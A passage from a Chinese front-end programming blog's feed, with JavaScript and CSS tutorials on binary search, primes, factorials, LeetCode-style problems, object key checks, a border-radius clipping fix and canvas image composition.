<span class="keyword">if</span> (key == arr[mid]) &#123;</span><br><span class="line">      <span class="keyword">return</span>  mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; arr[mid]) &#123;</span><br><span class="line">      low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(key &lt; arr[mid]) &#123;</span><br><span class="line">      high = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="找出数组当中的质数"><a href="#找出数组当中的质数" class="headerlink" title="找出数组当中的质数"></a>找出数组当中的质数</h1><p>质数：也称素数，&gt;1, 有无限个。除1和它自身之外不能被其他数整除，如2、3、5、7等，否则称为合数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 思想：m % n === 0, 等于0表示能整除，即不是质数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环生成一个100内的数组</span></span><br><span class="line"><span class="keyword">var</span> i, arr = [];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  arr.push(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getPrimes = arr.filter(<span class="function">(<span class="params">el</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">true</span>; <span class="comment">// 定义一个boolean值，filter返回布尔值</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (el &lt; <span class="number">2</span>) &#123; <span class="comment">// 小于2的直接排除</span></span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 使用小于当前元素的数值去整除当前当前元素，有一个可以整除则跳出循环</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">2</span>; j &lt; el; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (el % j === <span class="number">0</span>) &#123;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(getPrimes)</span><br></pre></td></tr></table></figure></p><h1 id="js求1-2-3-4-5-阶乘"><a href="#js求1-2-3-4-5-阶乘" class="headerlink" title="js求1! + 2! + 3! + 4! + 5!(阶乘)"></a>js求1! + 2! + 3! + 4! + 5!(阶乘)</h1><p>思路：s<br>转换成 <code>1! + (2 * 1!) + (3 * 2!) + (4 * 3!) + (5 * 4!)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>, <span class="comment">// 总和</span></span><br><span class="line">  sum2 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">  sum2 *= i; <span class="comment">// 当前第一数</span></span><br><span class="line">  sum += sum2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sum)</span><br></pre></td></tr></table></figure></p><h1 id="leetcode算法题"><a href="#leetcode算法题" class="headerlink" title="leetcode算法题"></a>leetcode算法题</h1><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br><strong>示例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure></p><p><strong>解答</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常规错误想法</span></span><br><span class="line"><span class="comment">// 原因：未考虑相同位相加，如[3, 2, 4]，会返回[0, 0]，因为相同位的3 + 3已经满足了条件</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">                <span class="keyword">return</span> [i, j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确解法: 双重循环式避开i和j相等的情况</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">                <span class="keyword">return</span> [i, j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="无重复字符的最长子串"><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a>无重复字符的最长子串</h2><p>给定一个字符串，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>示例</strong><br>示例 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure></p><p>示例 2:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="string">"bbbbb"</span></span><br><span class="line">输出: <span class="number">1</span></span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="string">"b"</span>，所以其长度为 <span class="number">1</span>。</span><br></pre></td></tr></table></figure></p><p>示例 3:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="string">"pwwkew"</span></span><br><span class="line">输出: <span class="number">3</span></span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="string">"wke"</span>，所以其长度为 <span class="number">3</span>。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，<span class="string">"pwke"</span> 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure></p><p><strong>解答</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 暴力法：耗时过长</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> maxLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt;= s.length; j++) &#123;</span><br><span class="line">            <span class="comment">// 通过确定i、j来获取所有的连续的子串，再通过方法查找该子串中是否存在重复的字符</span></span><br><span class="line">            <span class="keyword">if</span> (allUnique(s, i, j)) maxLen = <span class="built_in">Math</span>.max(maxLen, j - i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxLen;</span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查一个子字符串是否含有重复的字符</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; str</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; start</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; end</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> allUnique = <span class="function"><span class="keyword">function</span>(<span class="params">str, start, end</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tempStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="comment">// 查看临时字符串中是否已经包含了当前字符</span></span><br><span class="line">        <span class="keyword">if</span> (tempStr.includes(str.charAt(i))) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        tempStr += str.charAt(i); <span class="comment">// 不包含则存储</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h2><p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。<br><strong>示例</strong><br>示例 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure></p><p>示例 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure></p><p>示例 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure></p><p>假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31,  2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</p><p><strong>解答</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; x</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> reverse = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>, <span class="comment">// 翻转后的</span></span><br><span class="line">        num = <span class="built_in">Math</span>.abs(x); <span class="comment">// 取绝对值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 核心</span></span><br><span class="line">    <span class="keyword">while</span>(num) &#123;</span><br><span class="line">        sum = sum * <span class="number">10</span> + num % <span class="number">10</span>;</span><br><span class="line">        num = <span class="built_in">parseInt</span>(num / <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 核心代码壳可改成：借助数组reverse方法直接翻转</span></span><br><span class="line">    <span class="comment">// sum = parseInt(String(num).split('').reverse().join(''));</span></span><br><span class="line">    </span><br><span class="line">    sum = x &gt; <span class="number">0</span> ? sum : -sum; <span class="comment">// 补上原先的正负符号</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断溢出情况</span></span><br><span class="line">    <span class="keyword">if</span> (sum &gt; <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>) || sum &lt; -<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      前端常见的算法面试题
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>js判断对象object中存在某个key</title>
    <link href="http://pimichen.com/blog/javascript/%E5%88%A4%E6%96%AD%E5%AF%B9%E8%B1%A1%E4%B8%AD%E5%AD%98%E5%9C%A8%E6%9F%90%E4%B8%AAkey.html"/>
    <id>http://pimichen.com/blog/javascript/判断对象中存在某个key.html</id>
    <published>2019-03-02T16:00:00.000Z</published>
    <updated>2019-03-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>判断某个object中是否存在某个key，此处不作value真实值判断，key存在即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">  a: &quot;Jack&quot;,</span><br><span class="line">  b: &quot;Mark&quot;,</span><br><span class="line">  methodA: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  methodB: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>直接取key（返回vlaue/undefined）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj.a) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj.methodA) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>[]取值（返回value/undefined）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj[<span class="string">"a"</span>]) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj[<span class="string">"methodA"</span>]) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>in 关键字（返回true/false）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj &amp;&amp; <span class="string">"a"</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj &amp;&amp; <span class="string">"methodA"</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>hasOwnProperty判断属性是否存在（返回true/false）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj.hasOwnProperty(<span class="string">"a"</span>)) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj &amp;&amp; obj.hasOwnProperty(<span class="string">"methodA"</span>)) &#123;</span><br><span class="line">  <span class="comment">// 存在的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>注：<br>方法1和方法2通过取值的方式不够稳妥，假如改key的真实取值就是undefined，那么便会出问题，方法3和方法4比较靠谱。</p>]]></content>
    
    <summary type="html">
    
      js判断对象object中存在某个key值，检测存不存在
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>父级设置圆角无法挡住子级的背景色的解决办法</title>
    <link href="http://pimichen.com/blog/css/%E7%88%B6%E7%BA%A7%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92%E6%97%A0%E6%B3%95%E6%8C%A1%E4%BD%8F%E5%AD%90%E7%BA%A7%E7%9A%84%E8%83%8C%E6%99%AF%E8%89%B2%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/css/父级设置圆角无法挡住子级的背景色的解决办法.html</id>
    <published>2019-03-02T16:00:00.000Z</published>
    <updated>2019-03-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>问题如下图：<br><img src="../images/css/css_border-radius_bug.jpg" width="80%" title="border-radius异常情况"></p><p>解决办法如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-webkit-backface-visibility</span>: <span class="selector-tag">hidden</span>;</span><br><span class="line"><span class="selector-tag">-moz-backface-visibility</span>: <span class="selector-tag">hidden</span>;</span><br><span class="line"><span class="selector-tag">-webkit-transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br><span class="line"><span class="selector-tag">-moz-transform</span>: <span class="selector-tag">translate3d</span>(0, 0, 0);</span><br></pre></td></tr></table></figure></p><blockquote><p>参考：<a href="https://blog.csdn.net/wangshuo0407/article/details/79844596" target="_blank" rel="noopener">https://blog.csdn.net/wangshuo0407/article/details/79844596</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      父级div设置border-radius无法遮挡住子级div的背景颜色，设置overflow:hidden仍失效
    
    </summary>
    
    
      <category term="CSS" scheme="http://pimichen.com/blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>canvas将图片和文本合成图片</title>
    <link href="http://pimichen.com/blog/javascript/canvas%E5%90%88%E6%88%90%E5%9B%BE%E7%89%87%E5%92%8C%E6%96%87%E6%9C%AC.html"/>
    <id>http://pimichen.com/blog/javascript/canvas合成图片和文本.html</id>
    <published>2018-12-20T16:00:00.000Z</published>
    <updated>2017-12-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>需求为：将一张图片和用户输入的文字（居中显示，且超出指定宽度显示…）合成一张新的图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"posterCanvas"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">用户输入的文本：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"inputText"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"convertBtn"</span>&gt;</span>合成图片<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> convertBtn = <span class="built_in">document</span>.getElementById(<span class="string">'convertBtn'</span>);</span><br><span class="line">  convertBtn.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    drawCanvasDefaultPoster();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">drawCanvasDefaultPoster</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> inputText = <span class="built_in">document</span>.getElementById(<span class="string">'inputText'</span>),</span><br><span class="line">      posterCanvas = <span class="built_in">document</span>.getElementById(<span class="string">'posterCanvas'</span>),</span><br><span class="line">      posterContext = posterCanvas.getContext(<span class="string">'2d'</span>),</span><br><span class="line">      posterCanvasWidth = posterCanvas.width,</span><br><span class="line">      posterCanvasHeight = posterCanvas.height,</span><br><span class="line">      posterDefaultImg = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">    posterDefaultImg.src = <span class="string">'https://cdn-portrait.test.17zuoye.net//public/skin/teacher_coursewarev2/images/upload_example.png'</span>;</span><br><span class="line">    posterDefaultImg.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      posterContext.drawImage(posterDefaultImg, <span class="number">0</span>, <span class="number">0</span>, posterCanvasWidth, posterCanvasHeight); <span class="comment">// 填充图片</span></span><br><span class="line"></span><br><span class="line">      posterContext.font = <span class="string">'16px MicrosoftYaHei'</span>; <span class="comment">// 填充title</span></span><br><span class="line">      posterContext.textAlign = <span class="string">'center'</span>;</span><br><span class="line">      <span class="comment">// posterContext.fillText(inputText.value, 120, 114); // 如不处理限制文本宽度，直接绘制即可</span></span><br><span class="line">      <span class="keyword">var</span> wordWidth = <span class="number">0</span>; <span class="comment">// 字符宽度</span></span><br><span class="line">      <span class="keyword">var</span> inputValue = inputText.value; <span class="comment">// 操作的title</span></span><br><span class="line">      <span class="keyword">if</span> (posterContext.measureText(inputValue).width &lt; <span class="number">190</span>) &#123; <span class="comment">// title小于最大宽度，直接绘制</span></span><br><span class="line">          posterContext.fillText(inputValue, <span class="number">120</span>, <span class="number">114</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// title大于最大宽度则需要截取绘制</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; inputValue.length; i++) &#123; <span class="comment">// 遍历，根据当前的文本长度是否大于指定宽度，来截取</span></span><br><span class="line">              wordWidth += posterContext.measureText(inputValue[i]).width; <span class="comment">// 逐渐追加的文本宽度</span></span><br><span class="line">              <span class="keyword">if</span> (wordWidth &gt; <span class="number">190</span>) &#123; <span class="comment">// 指定（190 + '...'）</span></span><br><span class="line">                  posterContext.fillText(inputValue.substring(<span class="number">0</span>, i) + <span class="string">'...'</span>, <span class="number">120</span>, <span class="number">114</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> base64Url = posterCanvas.toDataURL(<span class="string">'image/jpeg'</span>, <span class="number">1.0</span>); <span class="comment">// toBase64</span></span><br><span class="line">      <span class="comment">// 此处取到base64就可以用了，如传给后端等</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// 如何限定宽度： https://blog.csdn.net/lishihong108/article/details/52483867?ref=myread</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      canvas将图片和文本（超出指定宽度隐藏，且居中显示）合成新的图片
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>js转换UTC时间戳</title>
    <link href="http://pimichen.com/blog/javascript/js%E8%BD%AC%E6%8D%A2UTC%E6%97%B6%E9%97%B4%E6%88%B3.html"/>
    <id>http://pimichen.com/blog/javascript/js转换UTC时间戳.html</id>
    <published>2018-12-18T16:00:00.000Z</published>
    <updated>2018-12-18T16:00:00.000Z</updated>
    
